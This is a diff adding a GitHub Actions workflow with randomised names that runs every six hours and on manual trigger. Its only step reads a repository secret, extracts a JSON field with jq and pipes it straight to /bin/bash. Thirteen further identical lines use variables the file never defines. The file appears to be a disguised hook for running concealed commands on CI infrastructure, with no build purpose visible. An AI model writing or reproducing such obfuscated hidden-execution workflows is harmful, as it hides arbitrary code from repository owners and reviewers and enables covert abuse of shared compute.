@@ -1,0 +1,31 @@
+name: sunbajie4718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sunbajie4718
+        env:
+          lqyti6350: ${{ secrets.lqyti6350 }}
+        run: |
+          echo $lqyti6350 | jq -r .mg2208 | /bin/bash
+          echo $lzsfp387 | jq -r .yc370 | /bin/bash
+          echo $kd1766 | jq -r .z0673 | /bin/bash
+          echo $yob392 | jq -r .xrl98570 | /bin/bash
+          echo $wcvu38 | jq -r .qtc74691 | /bin/bash
+          echo $qk52557 | jq -r .p07354 | /bin/bash
+          echo $gwpwt88713 | jq -r .g8 | /bin/bash
+          echo $cyoqi38 | jq -r .cojq743 | /bin/bash
+          echo $ppgh33148 | jq -r .ys052 | /bin/bash
+          echo $g9 | jq -r .wyg70 | /bin/bash
+          echo $gcs162 | jq -r .ed75311 | /bin/bash
+          echo $ureua46 | jq -r .w8348 | /bin/bash
+          echo $iefnw4979 | jq -r .xo413 | /bin/bash
+          echo $nhgv86 | jq -r .zham100 | /bin/bash
+
